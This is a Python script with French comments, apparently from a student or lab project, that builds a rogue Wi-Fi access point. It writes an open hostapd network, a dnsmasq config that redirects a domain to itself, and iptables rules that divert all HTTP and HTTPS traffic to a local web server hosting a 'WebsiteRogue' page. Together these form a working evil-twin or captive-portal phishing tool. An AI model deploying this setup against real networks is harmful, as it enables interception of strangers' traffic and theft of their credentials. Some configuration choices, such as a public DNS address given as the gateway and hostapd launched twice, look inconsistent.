import os
import subprocess
import time


# Création du fichier de configuration Hostapd
def create_hostapd_conf(interface, channel, essid):
    config_content = f"""interface={interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
auth_algs=1
"""
    with open("RogueAP/hostapd.conf", "w") as config_file:
        config_file.write(config_content)
    print("[SUCCESS] : Fichier de configuration Hostapd créé avec succès.")
        

# Création du fichier de configuration Dnsmasq
def create_dnsmasq_conf(interface):
    config_content = f"""interface={interface}
dhcp-range=192.168.1.20,192.168.1.80,12h
dhcp-option=3,8.8.8.8
dhcp-option=6,192.168.1.1
address=/connexion.com/192.168.1.1
"""
    with open("RogueAP/dnsmasq.conf", "w") as config_file:
        config_file.write(config_content)
    print("[SUCCESS] : Fichier de configuration Dnsmasq créé avec succès.")


# Configuration des règles iptables
def iptables_conf(interface):
    commands = [
        # Activation du forwarding IP
        "sudo sysctl -w net.ipv4.ip_forward=1",
        
        # Masquerading NAT pour permettre le routage vers Internet
        "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
        
        # Autoriser le trafic venant de l'interface AP
        f"sudo iptables -A FORWARD -i {interface} -j ACCEPT",
        
        # Redirection du trafic HTTP (port 80) vers 192.168.1.1
        "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1",
        
        # Redirection du trafic HTTPS (port 443) vers 192.168.1.1 (si besoin)
        "sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1",
        
        # Sauvegarde des règles iptables
        "sudo iptables-save > /etc/iptables.rules"
    ]

    for command in commands:
        if os.system(command) != 0:
            print(f"[ERROR] : Échec de l'exécution de la commande : {command}")
        else:
            print(f"[SUCCESS] : Commande exécutée avec succès : {command}")

    print("[INFO] : Toutes les règles iptables ont été appliquées.")
    

# Allumer l'interface réseau si elle est désactivée
def launch_interface(interface):
    if os.system(f"sudo ifconfig {interface} up") != 0:
        print("[ERROR] : Échec de l'activation de l'interface réseau. (Peut-être déjà activée)")
        return
    else:
        print("[SUCCESS] : Interface réseau activée.")


# Démarrer le service Hostapd
def start_hostapd():
    subprocess.Popen(["sudo", "hostapd", "RogueAP/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print("[SUCCESS] : Service Hostapd démarré avec succès.")
        

# Démarrer le service Dnsmasq
def start_dnsmasq():
    if os.system("sudo systemctl start dnsmasq") != 0:
        print("[ERROR] : Échec du démarrage du service Dnsmasq.")
    else:
        print("[SUCCESS] : Service Dnsmasq démarré avec succès.")


# Lancer le serveur HTTP Python
def start_http_server():
    os.chdir("src/rogue_ap/WebsiteRogue")
    http_server_process = subprocess.Popen(["sudo", "python3", "-m", "http.server", "80"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print("[SUCCESS] : Serveur HTTP démarré avec succès.")
    return http_server_process


# Configuration du Rogue AP        
def setup_rogue_ap(interface, channel, essid):
    create_hostapd_conf(interface, channel, essid)
    create_dnsmasq_conf(interface)
    iptables_conf(interface)
    launch_interface(interface)
    
    print("[INFO] : Configuration de l'adresse IP de l'AP...")
    os.system(f"sudo ifconfig {interface} 192.168.1.1 netmask 255.255.255.0 up")

    print("[INFO] : Vérification et arrêt des services en cours...")
    os.system("sudo systemctl stop hostapd")
    os.system("sudo systemctl stop dnsmasq")

    print("[INFO] : Lancement de Hostapd et Dnsmasq...")
    os.system("sudo hostapd RogueAP/hostapd.conf -B")
    os.system("sudo dnsmasq -C RogueAP/dnsmasq.conf")
    
    start_hostapd()
    start_dnsmasq()

    # print("[INFO] : Vérification des services...")
    # os.system("sudo systemctl status hostapd")
    # os.system("sudo systemctl status dnsmasq")
    

# Test de la fonction setup_rogue_ap
if __name__ == "__main__":
    setup_rogue_ap("wlan0mon", 6, "TestWifiProject")